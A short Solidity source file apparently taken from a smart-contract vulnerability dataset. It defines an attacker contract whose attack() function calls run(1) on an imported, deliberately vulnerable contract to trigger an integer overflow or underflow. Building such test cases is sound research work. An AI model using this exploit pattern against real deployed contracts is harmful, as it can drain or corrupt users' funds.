pragma solidity ^0.4.19;

import "../dataset/arithmetic/integer_overflow_minimal.sol";

contract IntegerOverflowMinimalAttacker {
    IntegerOverflowMinimal victimContract;

    constructor(address _victimAddress) public {
        victimContract = IntegerOverflowMinimal(_victimAddress);
    }

    function attack() public {
        uint256 count = victimContract.count();
        victimContract.run(1);
    }
}
